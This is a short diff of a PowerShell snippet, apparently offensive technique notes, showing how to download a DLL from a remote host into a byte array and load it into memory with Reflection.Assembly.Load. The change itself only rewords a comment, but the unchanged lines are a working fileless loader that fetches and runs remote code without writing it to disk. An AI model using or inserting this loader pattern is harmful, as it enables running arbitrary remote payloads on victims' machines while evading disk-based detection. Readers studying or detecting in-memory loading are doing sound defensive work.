@@ -1,7 +1,7 @@
 ##ClassLibary1.dll is the compiled dll from class1.cs
 ##DownloadData method will save DLL as a byte array in memory 
 $data = (New-Object System.Net.WebClient).DownloadData('http://IP/ClassLibrary1.dll')
-##load assembly
+##load assembly into the memeory as a byte array
 $assem = [System.Reflection.Assembly]::Load($data)
 
 #if you have to download the dll to disk, you can use the loadfile method
